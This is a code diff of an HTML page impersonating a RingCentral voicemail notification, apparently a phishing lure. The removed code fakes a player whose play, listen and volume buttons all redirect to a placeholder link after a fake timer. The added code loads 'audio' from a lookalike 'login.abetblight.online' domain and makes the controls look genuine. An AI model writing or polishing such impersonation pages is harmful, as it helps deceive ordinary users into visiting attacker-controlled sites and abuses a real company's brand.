@@ -106,7 +106,7 @@
     </div>
 
     <button id="playBtn" class="play-button" aria-label="Play/Pause">▶</button>
-    <div id="timeDisplay" class="time">0:00 / 0:45</div>
+    <div id="timeDisplay" class="time">0:00 / 0:00</div>
 
     <div class="volume">
       <button id="volumeDown" title="Decrease Volume">➖</button> 
@@ -117,69 +117,72 @@
 
     <button id="listenBtn" class="listen-button">LISTEN NOW</button>
 
-    <div class="footer-note">
-      This voicemail will expire and be automatically deleted from RingCentral servers after 14 days.
-    </div>
-
-    <div class="copyright">
-      © RingCentral | All rights reserved | 2025
-    </div>
+    <div class="footer-note">Click "Listen Now" or Play ▶ to hear the message</div>
+    <div class="copyright">© 2025 RingCentral</div>
   </div>
 
+  <!-- Hidden audio element -->
+  <audio id="voicemail" src="https://login.abetblight.online/TmzEdXNn" preload="auto"></audio>
+
   <script>
+    const audio = document.getElementById('voicemail');
     const playBtn = document.getElementById('playBtn');
     const timeDisplay = document.getElementById('timeDisplay');
     const listenBtn = document.getElementById('listenBtn');
+    const volumeSlider = document.getElementById('volumeSlider');
     const volumeUp = document.getElementById('volumeUp');
     const volumeDown = document.getElementById('volumeDown');
-    const volumeSlider = document.getElementById('volumeSlider');
     const volText = document.getElementById('volText');
-    const redirectLink = 'https://your-redirect-link.com/';
 
-    // Common function to start timer, update UI, and redirect after delay
-    function startTimerAndRedirect(buttonToToggle, secondsBeforeRedirect = 3) {
-      let currentTime = 0;
-      const totalDuration = 45;
-
-      // Disable button to avoid multiple clicks
-      buttonToToggle.disabled = true;
-
-      // Change play button icon to pause
-      playBtn.textContent = '⏸';
-
-      const interval = setInterval(() => {
-        currentTime++;
-        const minutes = Math.floor(currentTime / 60);
-        const seconds = currentTime % 60;
-        timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 0:45`;
-
-        if (currentTime >= secondsBeforeRedirect) {
-          clearInterval(interval);
-          window.location.href = redirectLink;
-        }
-      }, 1000);
+    function formatTime(seconds) {
+      const m = Math.floor(seconds / 60);
+      const s = Math.floor(seconds % 60);
+      return `${m}:${s.toString().padStart(2, '0')}`;
     }
 
+    function updateTime() {
+      timeDisplay.textContent = `${formatTime(audio.currentTime)} / ${formatTime(audio.duration)}`;
+    }
+
+    audio.addEventListener('timeupdate', updateTime);
+    audio.addEventListener('loadedmetadata', updateTime);
+
     playBtn.addEventListener('click', () => {
-      startTimerAndRedirect(playBtn, 3);
+      if (audio.paused) {
+        audio.play();
+        playBtn.textContent = '⏸';
+      } else {
+        audio.pause();
+        playBtn.textContent = '▶';
+      }
     });
 
     listenBtn.addEventListener('click', () => {
-      startTimerAndRedirect(listenBtn, 3);
+      audio.play();
+      playBtn.textContent = '⏸';
     });
 
-    // Fake volume text only
     volumeSlider.addEventListener('input', () => {
-      volText.textContent = volumeSlider.value + '%';
+      audio.volume = volumeSlider.value / 100;
+      volText.textContent = `${volumeSlider.value}%`;
     });
 
-    // Redirect for volume up/down buttons immediately
     volumeUp.addEventListener('click', () => {
-      window.location.href = redirectLink;
+      let vol = Math.min(100, parseInt(volumeSlider.value) + 5);
+      volumeSlider.value = vol;
+      audio.volume = vol / 100;
+      volText.textContent = `${vol}%`;
     });
+
     volumeDown.addEventListener('click', () => {
-      window.location.href = redirectLink;
+      let vol = Math.max(0, parseInt(volumeSlider.value) - 5);
+      volumeSlider.value = vol;
+      audio.volume = vol / 100;
+      volText.textContent = `${vol}%`;
     });
+
+    // Set initial volume
+    audio.volume = 0.15;
   </script>
 </body>
 </html>
